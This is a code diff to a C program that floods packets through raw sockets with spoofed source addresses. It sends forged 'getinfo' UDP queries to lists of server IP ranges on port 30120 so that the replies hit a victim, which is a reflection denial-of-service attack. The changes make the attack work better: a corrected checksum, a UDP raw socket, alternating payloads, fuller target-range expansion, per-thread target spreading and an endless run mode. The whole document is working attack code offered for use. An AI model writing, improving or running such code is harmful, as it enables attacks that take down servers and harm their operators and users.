@@ -12,7 +12,10 @@
 static unsigned int DPORT = 30120;
 
 static const char PAYLOAD[] =
-    "\xff\xff\xff\xff\x67\x65\x74\x69\x6e\x66\x6f\x2e\x78\x79\x7a";
+    "\xff\xff\xff\xff\x67\x65\x74\x69\x6e\x66\x6f";
+
+static const char PAYLOAD_ALT[] =
+    "\xff\xff\xff\xff\x67\x65\x74\x69\x6e\x66\x6f\x20\x78\x78\x78";
 
 
 #define MAX_PACKET_SIZE 4096
@@ -63,12 +66,18 @@ uint32_t rand_cmwc(void) {
 }
 
 
-unsigned short csum(unsigned short *buf, int lol) {
-  unsigned long sum;
-  for (sum = 0; lol > 0; lol--)
+unsigned short csum(unsigned short *buf, int len) {
+  unsigned long sum = 0;
+  while (len > 1) {
     sum += *buf++;
-  sum = (sum >> 16) + (sum & 0xffff);
-  sum += (sum >> 16);
+    len -= 2;
+  }
+  if (len == 1) {
+    sum += *(unsigned char *)buf << 8;
+  }
+  while (sum >> 16) {
+    sum = (sum & 0xffff) + (sum >> 16);
+  }
   return (unsigned short)(~sum);
 }
 
@@ -98,7 +107,7 @@ void *flood(void *par1) {
   struct udphdr *udph = (/*u_int8_t*/ void *)iph + sizeof(struct iphdr);
   struct sockaddr_in sin = td->sin;
   struct list *list_node = td->list_node;
-  int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
+  int s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
   if (s < 0) {
     fprintf(stderr, "Could not open raw socket.\n");
     exit(-1);
@@ -110,7 +119,8 @@ void *flood(void *par1) {
   udph->source = htons(tehport);
   iph->saddr = sin.sin_addr.s_addr;
   iph->daddr = list_node->data.sin_addr.s_addr;
-  iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
+  iph->check = 0;
+  iph->check = csum((unsigned short *)datagram, iph->tot_len);
   int tmp = 1;
   const int *val = &tmp;
   if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0) {
@@ -124,7 +134,19 @@ void *flood(void *par1) {
     list_node = list_node->next;
     iph->daddr = list_node->data.sin_addr.s_addr;
     iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
-    iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
+    
+    if (rand_cmwc() % 2) {
+      memcpy((void *)udph + sizeof(struct udphdr), PAYLOAD, sizeof(PAYLOAD) - 1);
+      udph->len = htons(sizeof(struct udphdr) + sizeof(PAYLOAD) - 1);
+      iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(PAYLOAD) - 1;
+    } else {
+      memcpy((void *)udph + sizeof(struct udphdr), PAYLOAD_ALT, sizeof(PAYLOAD_ALT) - 1);
+      udph->len = htons(sizeof(struct udphdr) + sizeof(PAYLOAD_ALT) - 1);
+      iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(PAYLOAD_ALT) - 1;
+    }
+    
+    iph->check = 0;
+    iph->check = csum((unsigned short *)datagram, iph->tot_len);
     sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_node->data,
            sizeof(list_node->data));
     pps++;
@@ -137,31 +159,50 @@ void *flood(void *par1) {
 }
 
 void generate_ip_range(struct list **head, const char *range) {
-    struct in_addr start, end;
-    inet_aton(range, &start);
-    end.s_addr = start.s_addr | ~((1 << (32 - atoi(strrchr(range, '/') + 1))) - 1);
-    for (start.s_addr++; start.s_addr <= end.s_addr; start.s_addr++) {
+    char *slash_pos = strchr(range, '/');
+    if (slash_pos == NULL) {
+        return;
+    }
+    
+    int prefix = atoi(slash_pos + 1);
+    if (prefix < 8 || prefix > 32) {
+        return;
+    }
+    
+    char range_copy[256];
+    strncpy(range_copy, range, slash_pos - range);
+    range_copy[slash_pos - range] = '\0';
+    
+    struct in_addr network;
+    if (inet_aton(range_copy, &network) == 0) {
+        return;
+    }
+    
+    uint32_t mask = ~((1U << (32 - prefix)) - 1);
+    uint32_t network_addr = ntohl(network.s_addr) & mask;
+    uint32_t broadcast_addr = network_addr | ~mask;
+    
+    uint32_t max_ips = (prefix < 20) ? 1000 : (broadcast_addr - network_addr - 1);
+    uint32_t generated = 0;
+    
+    for (uint32_t ip = network_addr + 1; ip < broadcast_addr && generated < max_ips; ip++, generated++) {
         struct list *new_node = (struct list *)malloc(sizeof(struct list));
         if (new_node == NULL) {
-            fprintf(stderr, "Erreur: malloc failed\n");
             exit(-1);
         }
         memset(new_node, 0x00, sizeof(struct list));
-        new_node->data.sin_addr.s_addr = start.s_addr;
+        new_node->data.sin_addr.s_addr = htonl(ip);
         new_node->data.sin_family = AF_INET;
         
         if (*head == NULL) {
-            // Premier nœud
             new_node->next = new_node;
             new_node->prev = new_node;
             *head = new_node;
         } else {
-            // Insérer dans la liste circulaire
-            new_node->prev = *head;
-            new_node->next = (*head)->next;
-            (*head)->next->prev = new_node;
-            (*head)->next = new_node;
-            *head = new_node;
+            new_node->prev = (*head)->prev;
+            new_node->next = *head;
+            (*head)->prev->next = new_node;
+            (*head)->prev = new_node;
         }
     }
 }
@@ -175,40 +216,40 @@ int main(int argc, char *argv[]) {
   srand(time(NULL));
   int i = 0;
   head = NULL;
-  fprintf(stdout, "Loading list to buffer\n");
   int max_len = 512;
   char *buffer = (char *)malloc(max_len);
   buffer = memset(buffer, 0x00, max_len);
   tehport = atoi(argv[2]);
   int num_threads = atoi(argv[4]);
   int maxpps = atoi(argv[5]);
-  limiter = 0;
+  limiter = 1000;
   pps = 0;
   int multiplier = 20;
   FILE *list_fd = fopen(argv[3], "r");
   if (list_fd == NULL) {
-    fprintf(stderr, "Erreur: Impossible d'ouvrir le fichier %s\n", argv[3]);
     exit(-1);
   }
   while (fgets(buffer, max_len, list_fd) != NULL) {
     if ((buffer[strlen(buffer) - 1] == '\n') ||
         (buffer[strlen(buffer) - 1] == '\r')) {
       buffer[strlen(buffer) - 1] = 0x00;
-      generate_ip_range(&head, buffer);
-      i++;
-    } else {
+    }
+    
+    if (strlen(buffer) == 0 || buffer[0] == '#' || buffer[0] == '\n' || buffer[0] == '\r') {
       continue;
     }
+    
+    generate_ip_range(&head, buffer);
+    i++;
   }
   fclose(list_fd);
   free(buffer);
   
   if (head == NULL) {
-    fprintf(stderr, "Erreur: Aucune adresse IP valide trouvée dans le fichier\n");
     exit(-1);
   }
   
-  struct list *current = head->next;
+  struct list *current = head;
   pthread_t thread[num_threads];
   struct sockaddr_in sin;
   sin.sin_family = AF_INET;
@@ -219,25 +260,47 @@ int main(int argc, char *argv[]) {
     td[i].sin = sin;
     td[i].list_node = current;
     pthread_create(&thread[i], NULL, &flood, (void *)&td[i]);
+    current = current->next;
   }
-  fprintf(stdout, "Spoofing Started\n");
-  for (i = 0; i < (atoi(argv[6]) * multiplier); i++) {
-    usleep((1000 / multiplier) * 1000);
-    if ((pps * multiplier) > maxpps) {
-      if (1 > limiter) {
-        sleeptime += 100;
+  int duration = atoi(argv[6]);
+  if (duration == -1) {
+    while (1) {
+      usleep((1000 / multiplier) * 1000);
+      if ((pps * multiplier) > maxpps) {
+        if (1 > limiter) {
+          sleeptime += 100;
+        } else {
+          limiter--;
+        }
       } else {
-        limiter--;
+        limiter++;
+        if (sleeptime > 25) {
+          sleeptime -= 25;
+        } else {
+          sleeptime = 0;
+        }
       }
-    } else {
-      limiter++;
-      if (sleeptime > 25) {
-        sleeptime -= 25;
-      } else {
-        sleeptime = 0;
-      }
+      pps = 0;
     }
-    pps = 0;
+  } else {
+    for (i = 0; i < (duration * multiplier); i++) {
+      usleep((1000 / multiplier) * 1000);
+      if ((pps * multiplier) > maxpps) {
+        if (1 > limiter) {
+          sleeptime += 100;
+        } else {
+          limiter--;
+        }
+      } else {
+        limiter++;
+        if (sleeptime > 25) {
+          sleeptime -= 25;
+        } else {
+          sleeptime = 0;
+        }
+      }
+      pps = 0;
+    }
   }
   return 0;
 }
